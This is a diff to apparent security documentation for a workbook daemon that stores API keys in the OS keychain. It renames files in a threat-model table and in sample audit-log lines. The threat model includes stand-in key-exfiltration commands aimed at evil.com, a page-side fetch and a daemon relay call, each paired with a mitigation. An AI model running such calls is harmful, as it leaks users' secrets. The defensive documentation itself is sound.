@@ -16,7 +16,7 @@ stays true:
 
 | Threat | Mitigation | Layer |
 |---|---|---|
-| Sharing a `.workbook.html` file leaks the user's keys | Keys never enter the file. Stored in OS keychain. | daemon |
+| Sharing a workbook leaks the user's keys | Keys never enter the file. Stored in OS keychain. | daemon |
 | User opens a malicious workbook that steals keys from another workbook on the same daemon | Keychain entries namespaced by hash of the workbook's path. Token→path lookup gates every read. | daemon |
 | Malicious code in the page exfiltrates keys via `fetch("https://evil.com")` | Browser-served `Content-Security-Policy: connect-src 'self'`. Page-side fetch wrapper as defense-in-depth. | both |
 | Daemon is abused as an open relay (`wb.fetch --secret=FAL https://evil.com`) | Per-secret HTTPS host allowlist, declared in workbook config, baked into a meta tag the daemon parses. | daemon |
@@ -174,10 +174,10 @@ Every security-relevant action lands in
 `~/.local/share/workbooksd/workbooksd-audit.log` (Linux):
 
 ```
-2026-05-02T05:51:58Z path=/Users/me/Downloads/colorwave.workbook.html action=secret-set       secret=FAL_API_KEY host=-
-2026-05-02T05:51:58Z path=/Users/me/Downloads/colorwave.workbook.html action=proxy            secret=FAL_API_KEY host=queue.fal.run
-2026-05-02T05:51:58Z path=/Users/me/Downloads/colorwave.workbook.html action=proxy-refused-domain secret=FAL_API_KEY host=evil.com
-2026-05-02T05:51:58Z path=/Users/me/Downloads/colorwave.workbook.html action=save-refused-leak secret=FAL_API_KEY host=-
+2026-05-02T05:51:58Z path=/Users/me/Downloads/colorwave.html action=secret-set       secret=FAL_API_KEY host=-
+2026-05-02T05:51:58Z path=/Users/me/Downloads/colorwave.html action=proxy            secret=FAL_API_KEY host=queue.fal.run
+2026-05-02T05:51:58Z path=/Users/me/Downloads/colorwave.html action=proxy-refused-domain secret=FAL_API_KEY host=evil.com
+2026-05-02T05:51:58Z path=/Users/me/Downloads/colorwave.html action=save-refused-leak secret=FAL_API_KEY host=-
 ```
 
 Actions: `serve`, `secret-set`, `secret-delete`, `secret-preview`,
